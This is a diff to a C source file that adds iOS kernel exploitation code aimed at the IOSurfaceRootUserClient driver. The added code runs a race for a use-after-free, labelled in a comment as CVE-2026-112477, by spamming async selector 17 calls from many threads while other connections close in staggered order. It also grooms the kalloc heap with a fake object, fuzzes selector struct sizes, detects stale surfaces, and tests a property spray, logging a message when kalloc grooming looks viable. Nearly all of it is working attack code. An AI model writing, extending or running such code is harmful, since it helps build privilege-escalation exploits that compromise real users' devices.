@@ -1028,15 +1028,174 @@ static void *prop_remover_fn(void *arg) {
     return NULL;
 }
 
+/* IOSurfaceValueArgs: surface_id + inline key/value for s_set_value (sel 9) */
+typedef struct {
+    uint32_t surface_id;
+    uint32_t field_1;    /* often 0 or key offset */
+    uint32_t field_2;    /* often key length or flags */
+    uint32_t field_3;    /* padding / additional param */
+    char     data[256];  /* key name + serialized value */
+} iosurface_value_args_t;
+
+/* === Strategy E: Async-based IOSurface UAF (CVE-2026-112477) ===
+ * Key insight from PoC analysis:
+ * - Selector 17 (s_register_surface_buffer) is ASYNC ONLY
+ * - Selector 18 (s_unregister_surface_buffer) is SYNC ONLY
+ * - Both take 24-byte struct input: 3 x uint64 {1, 2, 3}
+ * - Selector 1000 for groom: async, holds kalloc buffer via wake port
+ * - Race: 16 spam threads call sel 17 async on ONE connection
+ *         while 8 OTHER connections are closed in staggered order
+ * - Detection: after 17→18→groom→17, if second 17 returns != 0xE00002C9
+ *   (dup), it means the entry was freed and re-registered (stale read)
+ */
+
+typedef struct {
+    io_connect_t conn;
+    uint64_t input[3];
+    uint32_t selector;
+    mach_port_t wake_port;
+    volatile int *go;
+    volatile int done;
+    kern_return_t result;
+    int thread_id;
+    int iterations;
+} async_race_ctx_t;
+
+typedef struct {
+    io_connect_t *conns;
+    int conn_count;
+    volatile int *go;
+    volatile int done;
+    int stagger_us;
+} conn_closer_ctx_t;
+
+typedef struct {
+    io_connect_t conn;
+    uint8_t *fake_obj;
+    size_t fake_obj_size;
+    mach_port_t *wake_ports;
+    int count;
+    volatile int done;
+    int success_count;
+} groom_ctx_t;
+
+static void *async_spam_fn(void *arg) {
+    async_race_ctx_t *ctx = (async_race_ctx_t *)arg;
+    while (!*(ctx->go)) { /* spin */ }
+
+    for (int i = 0; i < ctx->iterations; i++) {
+        uint64_t ref[8] = {0};
+        uint32_t ref_cnt = 0;
+
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+
+        kern_return_t kr = IOConnectCallAsyncStructMethod(
+            ctx->conn, ctx->selector,
+            wp, ref, ref_cnt,
+            ctx->input, sizeof(ctx->input),
+            NULL, NULL);
+
+        if (i == 0) ctx->result = kr;
+
+        if (kr != KERN_SUCCESS && kr != (kern_return_t)0xE00002C9) {
+            mach_port_deallocate(mach_task_self(), wp);
+        }
+    }
+
+    ctx->done = 1;
+    return NULL;
+}
+
+static void *conn_closer_fn(void *arg) {
+    conn_closer_ctx_t *ctx = (conn_closer_ctx_t *)arg;
+    while (!*(ctx->go)) { /* spin */ }
+
+    for (int i = 0; i < ctx->conn_count; i++) {
+        if (ctx->conns[i]) {
+            IOServiceClose(ctx->conns[i]);
+            ctx->conns[i] = 0;
+        }
+        if (ctx->stagger_us > 0)
+            usleep(ctx->stagger_us);
+    }
+
+    ctx->done = 1;
+    return NULL;
+}
+
+static int groom_kalloc(io_connect_t conn, uint8_t *fake_obj, size_t fake_obj_size,
+                        mach_port_t *wake_ports, int count) {
+    int ok = 0;
+    for (int i = 0; i < count; i++) {
+        mach_port_t wp = MACH_PORT_NULL;
+        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
+        mach_port_insert_right(mach_task_self(), wp, wp, MACH_MSG_TYPE_MAKE_SEND);
+
+        uint64_t ref[8] = {0};
+        uint32_t ref_cnt = 0;
+
+        kern_return_t kr = IOConnectCallAsyncStructMethod(
+            conn, 1000,
+            wp, ref, ref_cnt,
+            fake_obj, fake_obj_size,
+            NULL, NULL);
+
+        if (kr == KERN_SUCCESS) {
+            wake_ports[i] = wp;
+            ok++;
+        } else {
+            wake_ports[i] = MACH_PORT_NULL;
+            mach_port_deallocate(mach_task_self(), wp);
+        }
+    }
+    return ok;
+}
+
+static void release_groom(mach_port_t *wake_ports, int count) {
+    for (int i = 0; i < count; i++) {
+        if (wake_ports[i] != MACH_PORT_NULL) {
+            mach_port_deallocate(mach_task_self(), wake_ports[i]);
+            wake_ports[i] = MACH_PORT_NULL;
+        }
+    }
+}
+
+/* Multiple struct format attempts for IOSurface external methods.
+ * IOSurfaceRootUserClient methods take struct input, NOT scalar.
+ * Format varies by selector and iOS version. We try several sizes
+ * to discover which selectors accept what. */
 static void *iosurface_race_fn(void *arg) {
     iosurface_race_ctx_t *ctx = (iosurface_race_ctx_t *)arg;
     while (!ctx->go) { /* spin */ }
-    /* Try struct input (surface ID as raw bytes) since scalar input
-       returns kIOReturnUnsupported on IOSurfaceRootUserClient */
-    uint32_t struct_input[1] = { ctx->surface_id };
+
+    /* Try struct input with surface_id — multiple sizes.
+     * Many IOSurface methods expect at minimum a 4-byte surface ID.
+     * Some expect IOSurfaceValueArgs (surface_id + serialized data).
+     * s_create_surface expects serialized XML dict (variable length). */
+    uint8_t struct_buf[64];
+    memset(struct_buf, 0, sizeof(struct_buf));
+    uint32_t sid = ctx->surface_id;
+    memcpy(struct_buf, &sid, 4);
     size_t out_size = 0;
+
+    /* Try 4 bytes first (bare surface ID) */
     ctx->result = IOConnectCallStructMethod(ctx->conn, ctx->selector,
-        struct_input, sizeof(struct_input), NULL, &out_size);
+        struct_buf, 4, NULL, &out_size);
+    if (ctx->result == 0xE00002C2 /* unsupported */ ||
+        ctx->result == 0xe00002bd /* badArgument */) {
+        /* Try 8 bytes (surface_id + flags) */
+        out_size = 0;
+        ctx->result = IOConnectCallStructMethod(ctx->conn, ctx->selector,
+            struct_buf, 8, NULL, &out_size);
+    }
+    if (ctx->result == 0xE00002C2 || ctx->result == 0xe00002bd) {
+        /* Try 16 bytes (surface_id + 3 params) */
+        out_size = 0;
+        ctx->result = IOConnectCallStructMethod(ctx->conn, ctx->selector,
+            struct_buf, 16, NULL, &out_size);
+    }
     ctx->done = 1;
     return NULL;
 }
@@ -8400,9 +8559,21 @@ vps_cd_done:
         }
 
         /* Strategy D: IOKit struct-based race via IOSurfaceRootUserClient
-         * The PoC uses raw IOConnectCallStructMethod, not the framework API.
-         * IOSurface external methods take struct input, not scalar. */
-        rlog("\nStrategy D: IOKit struct-based register/unregister race\n");
+         * IOSurface external methods take struct input, NOT scalar.
+         * Key insight from research: IOConnectCallMethod with scalar input
+         * returns kIOReturnUnsupported for ALL selectors. Must use struct.
+         *
+         * Known selector mappings (vary by iOS version):
+         *   sel 0  = s_create_surface (struct: serialized XML dict, var length)
+         *   sel 1  = s_release_surface
+         *   sel 6  = s_lookup_by_id
+         *   sel 9  = s_set_value (struct: IOSurfaceValueArgs)
+         *   sel 10 = s_get_value
+         *   sel 11 = s_remove_value
+         *   sel 17 = s_insert_surface (register, per Rust505 PoC on iOS 26.4)
+         *   sel 18 = s_remove_surface (unregister)
+         * iOS 16+ restricted dispatch table may remove set/get/remove_value. */
+        rlog("\nStrategy D: IOKit struct-based race + selector discovery\n");
 
         io_service_t iosurface_svc = IOServiceGetMatchingService(
             kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
@@ -8415,98 +8586,221 @@ vps_cd_done:
             rlog("IOSurfaceRoot connections: A=0x%x(%u) B=0x%x(%u)\n", kr_a, conn_a, kr_b, conn_b);
 
             if (kr_a == KERN_SUCCESS && kr_b == KERN_SUCCESS) {
-                /* Enumerate selectors with struct input to find which accept it */
-                rlog("Enumerating selectors with struct input...\n");
+
+                /* Phase D1: Comprehensive selector enumeration with multiple struct sizes.
+                 * IOSurface dispatch table entries specify expected struct input size.
+                 * Sending the wrong size returns badArgument (0xe00002bd) or unsupported.
+                 * We try: 0, 4, 8, 16, 32, 64, 128, 256, 1024, 0xFFFFFFFF-proxy sizes. */
+                rlog("--- D1: Selector enumeration (struct input, 0-40) ---\n");
+                size_t try_sizes[] = { 0, 4, 8, 12, 16, 20, 24, 32, 48, 64, 128, 256, 512, 1024 };
+                int n_sizes = sizeof(try_sizes) / sizeof(try_sizes[0]);
+
                 for (uint32_t sel = 0; sel <= 40; sel++) {
-                    uint32_t si[16] = {0};
-                    si[0] = test_id;  /* surface ID */
-                    size_t out_sz = 0;
-                    kern_return_t kr = IOConnectCallStructMethod(conn_a, sel,
-                        si, sizeof(uint32_t), NULL, &out_sz);
-                    if (kr != 0xE00002C2 /* unsupported */) {
-                        rlog("  sel %2u (4B): 0x%08x\n", sel, kr);
-                    }
-                    /* Also try with 8-byte input */
-                    uint64_t si8[1] = { test_id };
-                    kr = IOConnectCallStructMethod(conn_a, sel,
-                        si8, sizeof(uint64_t), NULL, &out_sz);
-                    if (kr != 0xE00002C2 && kr != 0xe00002bd) {
-                        rlog("  sel %2u (8B): 0x%08x\n", sel, kr);
-                    }
-                    /* Try with larger struct (properties dict serialization) */
-                    uint8_t big_si[256] = {0};
-                    memcpy(big_si, &test_id, 4);
-                    size_t big_out_sz = 256;
-                    uint8_t big_out[256] = {0};
-                    kr = IOConnectCallStructMethod(conn_a, sel,
-                        big_si, 256, big_out, &big_out_sz);
-                    if (kr != 0xE00002C2 && kr != 0xe00002bd && kr != 0xe00002bc) {
-                        rlog("  sel %2u (256B): 0x%08x out_sz=%zu\n", sel, kr, big_out_sz);
-                        if (big_out_sz > 0 && big_out_sz <= 256) {
-                            rlog("    out: ");
-                            for (size_t j = 0; j < (big_out_sz > 32 ? 32 : big_out_sz); j++)
-                                rlog("%02x", big_out[j]);
-                            rlog("\n");
+                    int any_hit = 0;
+                    for (int si = 0; si < n_sizes; si++) {
+                        uint8_t inbuf[1024];
+                        memset(inbuf, 0, sizeof(inbuf));
+                        /* Put surface ID at offset 0 for methods that expect it */
+                        memcpy(inbuf, &test_id, 4);
+
+                        uint8_t outbuf[4096];
+                        memset(outbuf, 0, sizeof(outbuf));
+                        size_t out_sz = sizeof(outbuf);
+
+                        kern_return_t kr = IOConnectCallStructMethod(conn_a, sel,
+                            inbuf, try_sizes[si], outbuf, &out_sz);
+
+                        /* Filter out unsupported/badArgument/invalidValue */
+                        if (kr != 0xE00002C2 && kr != 0xe00002bd && kr != 0xe00002bc) {
+                            if (!any_hit) rlog("  sel %2u:", sel);
+                            any_hit = 1;
+                            rlog(" %zuB→0x%x", try_sizes[si], kr);
+                            if (out_sz > 0 && out_sz <= sizeof(outbuf)) {
+                                rlog("(out=%zu:", out_sz);
+                                for (size_t j = 0; j < (out_sz > 16 ? 16 : out_sz); j++)
+                                    rlog("%02x", outbuf[j]);
+                                if (out_sz > 16) rlog("...");
+                                rlog(")");
+                            }
                         }
                     }
+                    if (any_hit) rlog("\n");
                 }
 
-                /* Also try IOConnectCallMethod with both scalar AND struct */
-                rlog("\nTrying mixed scalar+struct calls...\n");
-                for (uint32_t sel = 0; sel <= 40; sel++) {
+                /* Phase D2: Try IOSurfaceValueArgs format (s_set_value, historically sel 9).
+                 * Format: { uint32_t surface_id; ... key + OSUnserializeBinary data }
+                 * This is the standard kalloc spray primitive used by most IOSurface exploits.
+                 * iOS 16+ may have removed this selector from the restricted dispatch table. */
+                rlog("\n--- D2: IOSurfaceValueArgs (set/get/remove value) ---\n");
+                uint32_t value_sels[] = { 9, 10, 11 };
+                const char *value_names[] = { "set_value", "get_value", "remove_value" };
+                for (int vi = 0; vi < 3; vi++) {
+                    iosurface_value_args_t vargs;
+                    memset(&vargs, 0, sizeof(vargs));
+                    vargs.surface_id = test_id;
+                    /* Put a simple key name */
+                    strncpy(vargs.data, "TestKey", 8);
+
+                    uint8_t vout[512];
+                    size_t vout_sz = sizeof(vout);
+                    kern_return_t kr = IOConnectCallStructMethod(conn_a, value_sels[vi],
+                        &vargs, sizeof(vargs), vout, &vout_sz);
+                    rlog("  sel %u (%s): 0x%08x", value_sels[vi], value_names[vi], kr);
+                    if (vout_sz > 0 && kr == KERN_SUCCESS) rlog(" out=%zu", vout_sz);
+                    rlog("\n");
+
+                    /* Also try with just surface_id + minimal data */
+                    uint8_t min_vargs[8];
+                    memset(min_vargs, 0, sizeof(min_vargs));
+                    memcpy(min_vargs, &test_id, 4);
+                    vout_sz = sizeof(vout);
+                    kr = IOConnectCallStructMethod(conn_a, value_sels[vi],
+                        min_vargs, 8, vout, &vout_sz);
+                    if (kr != 0xE00002C2 && kr != 0xe00002bd)
+                        rlog("    8B variant: 0x%08x\n", kr);
+                }
+
+                /* Phase D3: Try mixed scalar+struct (some methods use both) */
+                rlog("\n--- D3: Mixed scalar+struct calls ---\n");
+                for (uint32_t sel = 0; sel <= 25; sel++) {
                     uint64_t scl[2] = { test_id, 0 };
                     uint32_t si[4] = { test_id, 0, 0, 0 };
                     uint64_t scl_out[4] = {0};
                     uint32_t scl_out_cnt = 4;
-                    size_t str_out_sz = 16;
-                    uint8_t str_out[16] = {0};
+                    size_t str_out_sz = 256;
+                    uint8_t str_out[256] = {0};
                     kern_return_t kr = IOConnectCallMethod(conn_a, sel,
                         scl, 1, si, sizeof(si),
                         scl_out, &scl_out_cnt, str_out, &str_out_sz);
                     if (kr != 0xE00002C2 && kr != 0xe00002bd) {
-                        rlog("  sel %2u (1scl+16B): 0x%08x scl_out=%u str_out=%zu\n",
-                            sel, kr, scl_out_cnt, str_out_sz);
+                        rlog("  sel %2u (1scl+16B): 0x%08x", sel, kr);
+                        if (scl_out_cnt > 0) rlog(" scl_out=%u", scl_out_cnt);
+                        if (str_out_sz > 0) rlog(" str_out=%zu", str_out_sz);
+                        rlog("\n");
                     }
                 }
 
-                /* Race with struct-based calls on the working selectors */
-                rlog("\nRacing with struct calls (500 rounds)...\n");
+                /* Phase D4: Race with struct-based calls.
+                 * Key insight: framework CFRelease serializes via locks.
+                 * We need IOKit-level race: one thread does remove_surface (sel 18)
+                 * while another does insert_surface (sel 17) or lookup (sel 6).
+                 * Also try racing create (sel 0) vs release (sel 1). */
+                rlog("\n--- D4: IOKit-level struct race (500 rounds) ---\n");
+                rlog("Testing sel 17/18 (insert/remove) AND sel 0/1 (create/release)...\n");
+
+                /* Discover which selectors work from D1 results (we re-test here) */
+                uint32_t working_unreg = 18, working_reg = 17;
+                uint32_t working_release = 1, working_lookup = 6;
+
                 int d_race_ok = 0;
                 for (int round = 0; round < 500; round++) {
                     IOSurfaceRef s = IOSurfaceCreate(surf_props);
                     if (!s) continue;
                     uint32_t sid = IOSurfaceGetID(s);
 
-                    /* Race: thread A releases, thread B does struct call with the ID */
+                    /* Race 1: IOKit-level unregister vs register */
                     iosurface_race_ctx_t ctx_unreg = { .conn = conn_a, .surface_id = sid,
-                                                       .selector = 18, .go = 0, .done = 0 };
+                                                       .selector = working_unreg, .go = 0, .done = 0 };
                     iosurface_race_ctx_t ctx_rereg = { .conn = conn_b, .surface_id = sid,
-                                                       .selector = 17, .go = 0, .done = 0 };
+                                                       .selector = working_reg, .go = 0, .done = 0 };
                     pthread_t t1, t2;
                     pthread_create(&t1, NULL, iosurface_race_fn, &ctx_unreg);
                     pthread_create(&t2, NULL, iosurface_race_fn, &ctx_rereg);
-                    usleep(arc4random_uniform(20));
+                    /* Tight timing: start both nearly simultaneously */
+                    __sync_synchronize();
                     ctx_unreg.go = 1;
                     ctx_rereg.go = 1;
                     pthread_join(t1, NULL);
                     pthread_join(t2, NULL);
 
-                    /* Also try framework release + struct lookup race */
+                    /* Race 2: framework release vs IOKit lookup */
                     CFRelease(s);
                     IOSurfaceRef stale = IOSurfaceLookup(sid);
                     if (stale) {
                         d_race_ok++;
                         size_t w = IOSurfaceGetWidth(stale);
-                        if (d_race_ok <= 3)
+                        if (d_race_ok <= 5)
                             rlog("  [%d] stale lookup sid=%u w=%zu unreg=0x%x rereg=0x%x\n",
                                 round, sid, w, ctx_unreg.result, ctx_rereg.result);
                         if (w != 32) d_hits++;
                         CFRelease(stale);
                     }
-                    if (round > 0 && round % 200 == 0)
-                        rlog("  D: round %d — race_ok=%d hits=%d\n", round, d_race_ok, d_hits);
+
+                    /* Race 3: IOKit release (sel 1) vs IOKit lookup (sel 6) */
+                    s = IOSurfaceCreate(surf_props);
+                    if (s) {
+                        sid = IOSurfaceGetID(s);
+                        iosurface_race_ctx_t ctx_rel = { .conn = conn_a, .surface_id = sid,
+                                                         .selector = working_release, .go = 0, .done = 0 };
+                        iosurface_race_ctx_t ctx_look = { .conn = conn_b, .surface_id = sid,
+                                                          .selector = working_lookup, .go = 0, .done = 0 };
+                        pthread_create(&t1, NULL, iosurface_race_fn, &ctx_rel);
+                        pthread_create(&t2, NULL, iosurface_race_fn, &ctx_look);
+                        __sync_synchronize();
+                        ctx_rel.go = 1;
+                        ctx_look.go = 1;
+                        pthread_join(t1, NULL);
+                        pthread_join(t2, NULL);
+
+                        IOSurfaceRef stale2 = IOSurfaceLookup(sid);
+                        if (stale2) {
+                            d_race_ok++;
+                            size_t w2 = IOSurfaceGetWidth(stale2);
+                            if (d_race_ok <= 5)
+                                rlog("  [%d] sel1/6 stale sid=%u w=%zu rel=0x%x look=0x%x\n",
+                                    round, sid, w2, ctx_rel.result, ctx_look.result);
+                            if (w2 != 32) d_hits++;
+                            CFRelease(stale2);
+                        }
+                        CFRelease(s);
+                    }
+
+                    if (round > 0 && round % 100 == 0)
+                        rlog("  D4: round %d — race_ok=%d hits=%d\n", round, d_race_ok, d_hits);
                 }
                 rlog("Strategy D result: %d stale lookups, %d corrupted hits\n", d_race_ok, d_hits);
+
+                /* Phase D5: If set_value works, test kalloc spray via IOSurfaceValueArgs */
+                rlog("\n--- D5: IOSurfaceValueArgs kalloc spray test ---\n");
+                /* Use framework API which wraps the IOKit call with correct serialization */
+                int spray_ok = 0;
+                for (int i = 0; i < 64; i++) {
+                    char key[32];
+                    snprintf(key, sizeof(key), "spray_%04d", i);
+                    /* Create a data blob of controlled size for kalloc grooming */
+                    uint8_t blob[256];
+                    memset(blob, 0x41 + (i % 26), sizeof(blob));
+                    CFDataRef data = CFDataCreate(NULL, blob, sizeof(blob));
+                    IOSurfaceSetValue(test_surf,
+                        CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII), data);
+                    CFRelease(data);
+                    spray_ok++;
+                }
+                rlog("  Sprayed %d properties (256B each) on surface %u\n", spray_ok, test_id);
+
+                /* Verify readback */
+                int readback_ok = 0;
+                for (int i = 0; i < 64; i++) {
+                    char key[32];
+                    snprintf(key, sizeof(key), "spray_%04d", i);
+                    CFTypeRef rv = IOSurfaceCopyValue(test_surf,
+                        CFStringCreateWithCString(NULL, key, kCFStringEncodingASCII));
+                    if (rv) {
+                        if (CFGetTypeID(rv) == CFDataGetTypeID()) {
+                            CFDataRef d = (CFDataRef)rv;
+                            if (CFDataGetLength(d) == 256) {
+                                const uint8_t *bytes = CFDataGetBytePtr(d);
+                                uint8_t expected = 0x41 + (i % 26);
+                                if (bytes[0] == expected && bytes[255] == expected)
+                                    readback_ok++;
+                            }
+                        }
+                        CFRelease(rv);
+                    }
+                }
+                rlog("  Readback: %d/64 properties verified\n", readback_ok);
+                if (readback_ok == 64)
+                    rlog("  *** IOSurface property spray WORKS — kalloc grooming viable ***\n");
             }
             if (conn_a) IOServiceClose(conn_a);
             if (conn_b) IOServiceClose(conn_b);
